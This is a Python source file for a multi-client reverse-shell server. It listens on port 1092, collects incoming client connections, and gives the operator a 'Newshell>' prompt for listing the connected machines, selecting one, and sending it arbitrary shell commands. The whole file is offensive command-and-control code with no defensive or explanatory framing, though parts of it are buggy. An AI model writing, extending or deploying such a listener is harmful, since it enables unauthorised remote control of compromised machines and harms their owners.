import socket
import threading
import queue

threads = 2
task_no = [1,2]
connections = []
address = []

q = queue.Queue()

# Create a socket

def new_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 1092
        s = socket.socket()

    except socket.error as msg:
        print(f"Failed to connect to {msg}")


#Bind the incoming connection

def bind_incoming_conn():
    try:
        global host
        global port
        global s

        s.bind((host,port))
        s.listen(4)

    except socket.error as msg:
        print("Could not connect to the socket {}".format(msg))


#Handle Connection

def handle_connection():
    for i in connections:
        i.close()
    del connections[:]
    del address[:]

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(2)

            connections.append(conn)
            address.append(addr)

            print(f"You are connected to {address[0]}")

        except:
            print("There was an error")
            del connections[:]
            del address[:]
            break

# Now that there is a list of clients, to send commands to an individual client, create an interactive prompt.
# Can create clients with an index number with a simple select 0,1,2... can select any client.
# newshell> list should return an o/p of all clients... 0 Client1 Port

def new_shell():
    while True:
        cmd = input("Newshell> ")
        if cmd == 'list':
            list_of_connections()
        elif 'select' in cmd:
            conn = get_a_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Error recognizing the comamnd")


def list_of_connections():
    while True:
        for v,conn in enumerate(connections):
            try:
                conn.send(str.encode(''))
                result = conn.recv(20480)
            except:
                del connections[v]
                del address[v]
                continue

            # result = str(v) + " " + str(address[v][0]) + " " + str(address[v][1]) + "\n"

            print("List of Clients" + "\n" + repr(result))

def get_a_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)

        conn = connections[target]
        print("You are now connected to :" + str(address[target][0]))
        print(str(address[target][0]) + ">", end="")
        return conn
    except:
        print("Error")


def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            if len(str.encode(cmd)) >0:
                conn.send(str.encode(cmd))
                response = str(conn.recv(20480), 'utf-8')
                print(response,end='')
        except:
            print("Error")


def threading_function():
    for _ in range(threads):
        t = threading.Thread(target=next_job)
        t.daemon = True
        t.start()


def next_job():
    while True:
        item = q.get()
        if item == 1:
            new_socket()
            bind_incoming_conn()
            handle_connection()
        if item == 2:
            new_shell()

        q.task_done()


def create_task():
    for item in task_no:
        q.put(item)

    q.join()

threading_function()
create_task()

